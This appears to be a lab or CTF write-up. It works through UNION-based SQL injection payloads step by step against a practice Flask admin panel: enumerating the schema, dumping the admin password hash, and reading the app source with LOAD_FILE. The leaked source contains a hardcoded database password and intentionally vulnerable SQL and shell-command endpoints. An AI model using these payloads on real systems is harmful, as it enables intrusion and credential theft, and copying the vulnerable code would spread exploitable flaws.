@@ -1,0 +1,73 @@
+enumerating admin pannel using sql injection 
+
+' union select NULL,NULL,NULL where '1' = '1
+
+we can comfirm how many colums are there as it can be seen on dashboard itself if u add one more Null value then it will return Internal Server Error
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+identifying schema 
+
+' union select table_schema,NULL,NULL from information_schema.tables where '1' = '1
+
+Username 	            Email 	Registered
+information_schema    NULL 	    N/A
+
+admin_panel_db        NULL 	    N/A
+
+performance_schema	  NULL 	    N/A
+
+mysql	                NULL 	    N/A
+
+sys	                  NULL 	    N/A
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+now after we identified the schema and now we want to know the table_name inside admin_panel_db
+
+' union select table_schema,table_name,null from information_schema.tables where table_schema='admin_panel_db
+
+Username       	  Email 	Registered
+
+admin_panel_db  	users 	  N/A
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+now lets know the columns inside table schema admin_panel_db
+
+' union select column_name,null,null from information_schema.columns where table_schema='admin_panel_db
+
+Username 	  Email 	Registered
+
+id          NULL 	  N/A
+
+username    NULL 	  N/A
+
+email       NULL 	  N/A
+
+password    NULL 	  N/A
+
+created_at  NULL 	  N/A
+
+updated_at	NULL 	  N/A
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+now we have table name users and colunm names username and password we can get the data out 
+
+' union select username,password,null from users where '1'='1
+
+Username 	Email 	                                                                                                                                                            Registered
+admin    scrypt:32768:8:1$RPobHROJFiQewGcF$1336ebfc13f9dd71bd2f6467d2e4c4aa1125e8d7258381583fdb548ef2d045526e2b5ca782f85da90dc510373a370ccfd53e0b6a9a7f18cadceda7c6e489fe63 	  N/A
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+now we see the 
+
+' union select LOAD_FILE('/app/app.py'),NULL,NULL from users where '1'='1  
+
+Username 	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Email 	Registered                             
+from flask import Flask, render_template, request, redirect, url_for, flash, session from werkzeug.security import generate_password_hash, check_password_hash import pymysql import os from functools import wraps app = Flask(__name__) # Configuration app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key-change-in-production') DB_HOST = os.environ.get('DB_HOST', 'localhost') DB_USER = os.environ.get('DB_USER', 'root') DB_PASSWORD = os.environ.get('DB_PASSWORD', 'A7m$wQ4!sNz2%yK') DB_NAME = os.environ.get('DB_NAME', 'admin_panel_db') # Database connection helper def get_db(): return pymysql.connect( host=DB_HOST, user=DB_USER, password=DB_PASSWORD, database=DB_NAME, cursorclass=pymysql.cursors.DictCursor ) # Login required decorator def login_required(f): @wraps(f) def decorated_function(*args, **kwargs): if 'user_id' not in session: flash('Please login to access this page.', 'warning') return redirect(url_for('login')) return f(*args, **kwargs) return decorated_function @app.route('/') def index(): if 'user_id' in session: return redirect(url_for('dashboard')) return redirect(url_for('login')) @app.route('/login', methods=['GET', 'POST']) def login(): if 'user_id' in session: return redirect(url_for('dashboard')) if request.method == 'POST': username = request.form.get('username') password = request.form.get('password') if not username or not password: flash('Please fill in all fields.', 'danger') return render_template('login.html') # Check user credentials db = get_db() cur = db.cursor() cur.execute("SELECT * FROM users WHERE username = %s", (username,)) user = cur.fetchone() cur.close() db.close() if user and check_password_hash(user['password'], password): session['user_id'] = user['id'] session['username'] = user['username'] session['email'] = user['email'] flash(f'Welcome back, {user["username"]}!', 'success') return redirect(url_for('dashboard')) else: flash('Invalid username or password.', 'danger') return render_template('login.html') @app.route('/dashboard') @login_required def dashboard(): search_query = request.args.get('search', '').strip() # Get some statistics db = get_db() cur = db.cursor() # Total users cur.execute("SELECT COUNT(*) as count FROM users") total_users = cur.fetchone()['count'] # Recent users or search results if search_query: # VULNERABLE: SQL Injection - search query is directly concatenated query = f"SELECT username, email, created_at FROM users WHERE username LIKE '{search_query}'" cur.execute(query) recent_users = cur.fetchall() search_count = len(recent_users) else: cur.execute("SELECT username, email, created_at FROM users ORDER BY created_at DESC LIMIT 5") recent_users = cur.fetchall() search_count = None cur.close() db.close() return render_template('dashboard.html', username=session.get('username'), email=session.get('email'), total_users=total_users, recent_users=recent_users, search_query=search_query, search_count=search_count) @app.route('/execute') @login_required def execute_command(): # VULNERABLE: Command Injection - user input directly executed cmd = request.args.get('cmd', '') if not cmd: return {'error': 'No command specified', 'output': ''}, 400 try: import subprocess # VULNERABLE: Direct command execution without sanitization result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5) output = result.stdout + result.stderr return { 'success': True, 'command': cmd, 'output': output, 'return_code': result.returncode } except subprocess.TimeoutExpired: return {'error': 'Command timeout', 'output': ''}, 408 except Exception as e: return {'error': str(e), 'output': ''}, 500 @app.route('/logout') @login_required def logout(): username = session.get('username') session.clear() flash(f'Goodbye, {username}! You have been logged out.', 'info') return redirect(url_for('login')) if __name__ == '__main__': # Wait a bit for database to be ready import time time.sleep(2) app.run(debug=False, host='0.0.0.0', port=5000)    NULL 	  N/A          
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
